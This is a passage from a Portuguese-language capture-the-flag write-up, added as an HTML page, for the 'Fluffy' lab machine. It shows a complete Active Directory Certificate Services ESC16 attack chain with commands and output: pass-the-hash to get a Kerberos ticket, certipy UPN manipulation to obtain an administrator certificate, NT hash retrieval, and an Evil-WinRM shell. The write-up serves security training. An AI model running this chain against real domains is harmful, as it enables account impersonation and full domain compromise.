+                para conseguir logar na conta em qualquer serviço :)</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# python3 /root/windows/python3-impacket/examples/getTGT.py fluffy.htb/ca_svc / 
+-hashes &#39;hash ntml&#39;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ca_svc.ccache
+
+┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# export KRB5CCNAME=ca_svc.ccache 
+                                                                                                         
+┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# klist
+Ticket cache: FILE:ca_svc.ccache
+Default principal: ca_svc@FLUFFY.HTB
+
+Valid starting       Expires              Service principal
+07/30/2025 01:49:13  07/30/2025 11:49:13  krbtgt/FLUFFY.HTB@FLUFFY.HTB
+    renew until 07/31/2025 01:49:12</code></pre>
+                <p><code>[0x0539] &gt;</code> Verificando templates
+                vulneraveis agora que temos acesso a conta
+                <code>CA_SVC</code> podemos explorar Certificados!
+                podemos ver que tem vulnerabilidadede no certificado
+                chamada <code>ESC16</code>, essa vulnerabilidade de
+                forma resumida permite gerar certificado se passando por
+                qualquer usuário alterando a <code>UPN</code> vamos ao
+                exemplo, somos o usuário ca_svc temos controle sobre o
+                <code>ADCS</code>, vamos adicionar o <code>UPN</code> do
+                administrator a nossa conta <code>ca_svc</code> assim
+                podemos solicitar certificado no template user, como o
+                <code>UPN</code> é do administrator o usuário
+                <code>ca_svc</code> acaba se passando pelo administrator
+                e obtemos o pfx do administrator. segue abaixo a cadeia
+                de ataques. se tiver interresado em entender de forma
+                detalhada:</p>
+                <p><a
+                href="https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6">https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6</a></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# certipy find -username &#39;ca_svc&#39; -k -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb
+
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.</code></pre>
+                <p><code>[0x0539] &gt;</code> Explorando o
+                <code>ESC16</code>, e mudando o <code>UPN</code> da
+                <code>CA_SVC</code></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; /
+-dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -upn &#39;administrator&#39; /
+-user &#39;ca_svc&#39; update
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.164.91&#39;
+[+] DC IP: &#39;10.129.164.91&#39;
+[+] DC Host: &#39;DC01.fluffy.htb&#39;
+[+] Target IP: &#39;10.129.164.91&#39;
+[+] Remote Name: &#39;DC01.fluffy.htb&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;CA_SVC&#39;
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.164.91:636 - ssl
+[+] Default path: DC=fluffy,DC=htb
+[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
+[*] Updating user &#39;ca_svc&#39;:
+    userPrincipalName                   : administrator
+[*] Successfully updated &#39;ca_svc&#39;</code></pre>
+                <p><code>[0x0539] &gt;</code> confirmando se está setado
+                o <code>UPN</code> do administrator</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; / 
+-dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -user &#39;ca_svc&#39; read
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.164.91&#39;
+[+] DC IP: &#39;10.129.164.91&#39;
+[+] DC Host: &#39;DC01.fluffy.htb&#39;
+[+] Target IP: &#39;10.129.164.91&#39;
+[+] Remote Name: &#39;DC01.fluffy.htb&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;CA_SVC&#39;
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.164.91:636 - ssl
+[+] Default path: DC=fluffy,DC=htb
+[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
+[*] Reading attributes for &#39;ca_svc&#39;:
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-08-01T21:53:02+00:00</code></pre>
+                <p><code>[0x0539] &gt;</code> obtendo o <code>PFX</code>
+                do administrator</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# certipy -debug req -username &#39;administrator&#39; -hashes &#39;:hash&#39; -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -ca &#39;fluffy-DC01-CA&#39; -template &#39;User&#39;
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.164.91&#39;
+[+] DC IP: &#39;10.129.164.91&#39;
+[+] DC Host: None
+[+] Target IP: None
+[+] Remote Name: &#39;DC01.fluffy.htb&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;ADMINISTRATOR&#39;
+[+] Trying to resolve &#39;DC01.fluffy.htb&#39; at &#39;10.129.164.91&#39;
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.164.91[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.164.91[\pipe\cert]
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;administrator&#39;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+[+] Attempting to write data to &#39;administrator.pfx&#39;
+[+] Data written to &#39;administrator.pfx&#39;
+[*] Wrote certificate and private key to &#39;administrator.pfx&#39;</code></pre>
+                <p><code>[0x0539] &gt;</code> Mudando o <code>UPN</code>
+                para os devidos usuários!</p>
+                <p><code>[0x0539] &gt;</code> Agora temos que se atentar
+                a um detalhe importante para não ter conflito na hora de
+                autenticarmos com o certificado. Temos que voltar o
+                <code>UPN</code> da conta do <code>ca_svc</code> para a
+                <a href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a>
+                ou seja o <code>UPN</code> dele, assim o administrator
+                vai ter o <code>UPN</code> dele mesmo no caso o <a
+                href="mailto:administrator@fluffy.htb">administrator@fluffy.htb</a>,
+                e o <code>ca_svc</code> com o <a
+                href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a>.</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; -dc-ip 10.129.164.91 -ns 10.129.164.91 /
+-target DC01.fluffy.htb -upn &#39;ca_svc@fluffy.htb&#39; -user &#39;ca_svc&#39; update       
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.164.91&#39;
+[+] DC IP: &#39;10.129.164.91&#39;
+[+] DC Host: &#39;DC01.fluffy.htb&#39;
+[+] Target IP: &#39;10.129.164.91&#39;
+[+] Remote Name: &#39;DC01.fluffy.htb&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;CA_SVC&#39;
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.164.91:636 - ssl
+[+] Default path: DC=fluffy,DC=htb
+[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
+[*] Updating user &#39;ca_svc&#39;:
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated &#39;ca_svc&#39;</code></pre>
+                <p><code>[0x0539] &gt;</code> obtendo a hash do
+                administrator e obtendo a flag r00t!</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.164.91
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;administrator&#39;
+[*] Using principal: &#39;administrator@fluffy.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@fluffy.htb&#39;: HASH_NTLM
+                                                                                                         
+┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# evil-winrm -i 10.129.164.91 -u &#39;administrator&#39; -H &#39;hash&#39;
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../desktop/root.txt
+1337_ROOT_:|
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre>
+                <p>Terminamos mais uma máquina espero que tenha
+                aprendido algo nessa sala, nos vemos nas próximas!</p>
+            </article>
+
+            <a href="../../index.html" class="back-link">← Voltar para a página principal</a>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <span>&copy; 2025 - pwnbuffer.org </span>
+                <span class="footer-separator">|</span>
+                <a href="https://discord.gg/RZVv6baUc7" target="_blank" class="footer-link">[ Discord ]</a>
+                <span class="footer-separator">|</span>
+                <a href="https://x.com/pwnbff" target="_blank" class="footer-link">[ X ] </a>
+                <span class="footer-separator">|</span>
+                <a href="../../a/wallpapers.html" target="_blank" class="footer-link">[ Wallpapers ] </a>
+
+        </footer>
+    </div>
+
+</body>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const els = document.querySelectorAll(".glitch-text, .pwntitle");
+        const chars = "\u0025\u0023\u0024\u0040\u005E\u0026\u002A\u0021\u003F\u003C\u002D\u003E\u002B\u007C\u002A";
+
+        els.forEach(el => {
+            const originalText = el.textContent;
+
+            function glitchEffect() {
+                let iterations = 0;
+                const interval = setInterval(() => {
+                    el.textContent = originalText
+                        .split("")
+                        .map((letter, index) => {
+                            if (index < iterations) {
+                                return originalText[index];
+                            }
+                            return chars[Math.floor(Math.random() * chars.length)];
+                        })
+                        .join("");
+
+                    iterations += 1 / 2;
+
+                    if (iterations >= originalText.length) {
+                        clearInterval(interval);
+                        el.textContent = originalText;
+                    }
+                }, 50);
+            }
+
+            setInterval(glitchEffect, 20000);
+        });
+    });
+</script>
+
+</html>
